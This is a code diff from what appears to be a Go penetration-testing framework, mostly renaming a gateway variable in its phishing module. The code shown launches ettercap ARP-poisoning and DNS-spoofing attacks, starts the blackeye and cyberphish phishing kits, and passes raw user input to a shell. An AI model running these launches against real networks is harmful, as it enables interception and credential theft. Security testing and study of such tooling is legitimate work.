@@ -50,7 +50,7 @@ func PhishingPentest() {
         case "run", "start", "launch", "exploit", "execute":
             executeFunction()
         default:
-            utils.SystemShell(Input)
+            utils.SystemShell(strings.ToLower(Input))
         }
     }
 }
@@ -159,7 +159,7 @@ func handleSetCommand(parts []string) {
       "build": &utils.BuildName,
       "proxies": &utils.Proxies,
       "passwd": &utils.BeefPass,
-      "gateway": &utils.Gateway,
+      "gateway": &utils.GateWay,
       "fakedns": &utils.FakeDns,
       "spoofer": &utils.Spoofer,
       "toolsdir": &utils.ToolsDir,
@@ -273,7 +273,7 @@ func handleUnsetCommand(parts []string) {
       "build": &utils.BuildName,
       "proxies": &utils.Proxies,
       "passwd": &utils.BeefPass,
-      "gateway": &utils.Gateway,
+      "gateway": &utils.GateWay,
       "fakedns": &utils.FakeDns,
       "spoofer": &utils.Spoofer,
       "toolsdir": &utils.ToolsDir,
@@ -506,7 +506,7 @@ func CyberPhish() {
     subprocess.Run(`cd %s/cyberphish/; %s ./cyberphish.py`, utils.PhishersTools, utils.VenvPython)
 }
 
-func NinjaEttercap(LHost, Gateway, PhFakeDns, RHost, IFace, Target string) {
+func NinjaEttercap(LHost, GateWay, PhFakeDns, RHost, IFace, Target string) {
     switch strings.ToLower(Target) {
     case "one":
         filePathO := "/etc/ettercap/etter.conf.bak_africana"
@@ -535,7 +535,7 @@ func NinjaEttercap(LHost, Gateway, PhFakeDns, RHost, IFace, Target string) {
             }
         utils.Editors(filesToReplacements)
         }
-        subprocess.Run(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "ettercap -TQi %s -M arp:remote -P dns_spoof /%s// /%s//" &`, IFace, utils.RHost, Gateway)
+        subprocess.Run(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "ettercap -TQi %s -M arp:remote -P dns_spoof /%s// /%s//" &`, IFace, utils.RHost, GateWay)
         subprocess.Run(`cd %s/blackeye; bash ./blackeye.sh`, utils.PhishersTools)
         fmt.Println()
         subprocess.Run(`rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns`)
@@ -584,7 +584,7 @@ func NinjaEttercap(LHost, Gateway, PhFakeDns, RHost, IFace, Target string) {
     fmt.Println()
 }
 
-func NinjaBettercap(LHost, Gateway, PhFakeDns, RHost, IFace, Target string) {
+func NinjaBettercap(LHost, GateWay, PhFakeDns, RHost, IFace, Target string) {
     if Target == ""{
         fmt.Printf("\n%s[!] %sMissing required parameter SPOOFER. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
@@ -602,16 +602,16 @@ func NinjaBettercap(LHost, Gateway, PhFakeDns, RHost, IFace, Target string) {
     }
 }
 
-func NinjaPhish(Spoofer, LHost, Gateway, PhFakeDns, RHost, IFace, Target string) {
+func NinjaPhish(Spoofer, LHost, GateWay, PhFakeDns, RHost, IFace, Target string) {
     if utils.Spoofer == ""{
         fmt.Printf("\n%s[!] %sMissing required parameter SPOOFER. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
     }
     switch strings.ToLower(utils.Spoofer) {
     case "ettercap":
-         NinjaEttercap(utils.LHost, Gateway, utils.PhFakeDns, utils.RHost, IFace, Target)
+         NinjaEttercap(utils.LHost, GateWay, utils.PhFakeDns, utils.RHost, IFace, Target)
     case "bettercap":
-         NinjaBettercap(utils.LHost, Gateway, utils.PhFakeDns, utils.RHost, IFace, Target)
+         NinjaBettercap(utils.LHost, GateWay, utils.PhFakeDns, utils.RHost, IFace, Target)
     default:
         fmt.Printf("\n%s[!] %sMissing required parameter SPOOFER. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
